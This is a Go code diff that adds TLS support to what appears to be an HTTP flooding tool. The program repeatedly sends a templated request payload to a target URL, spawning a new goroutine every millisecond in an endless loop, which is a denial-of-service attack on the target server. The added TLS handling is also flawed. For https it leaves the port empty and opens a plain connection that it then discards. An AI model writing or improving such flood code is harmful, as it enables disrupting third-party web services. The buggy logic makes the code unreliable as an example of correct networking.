@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"fmt"
 	"html/template"
 	"net"
@@ -46,14 +47,23 @@ func generatePayload(method, host, path string) ([]byte, error) {
 	return buf.Bytes(), nil
 }
 
-func do(host, port, path string, payload []byte) {
+func do(host, port, path string, payload []byte, isTLS bool) {
 	defer func() {
 		recover()
 	}()
 
-	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
+	addr := fmt.Sprintf("%s:%s", host, port)
+
+	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		panic("failed to open socket")
+	}
+
+	if isTLS {
+		conn, err = tls.Dial("tcp", addr, nil)
+		if err != nil {
+			panic("failed to open socket")
+		}
 	}
 
 	_, err = conn.Write(payload)
@@ -65,6 +75,8 @@ func do(host, port, path string, payload []byte) {
 }
 
 func main() {
+	isTLS := false
+
 	parsedURL, err := url.Parse(URL)
 	if err != nil {
 		panic("failed to parse url")
@@ -74,8 +86,11 @@ func main() {
 
 	port := parsedURL.Port()
 	if port == "" {
-		if parsedURL.Scheme == "http" {
+		switch parsedURL.Scheme {
+		case "http":
 			port = "80"
+		case "https":
+			isTLS = true
 		}
 	}
 
@@ -91,7 +106,7 @@ func main() {
 
 	for {
 		go func() {
-			do(host, port, path, payload)
+			do(host, port, path, payload, isTLS)
 		}()
 		time.Sleep(time.Millisecond)
 	}
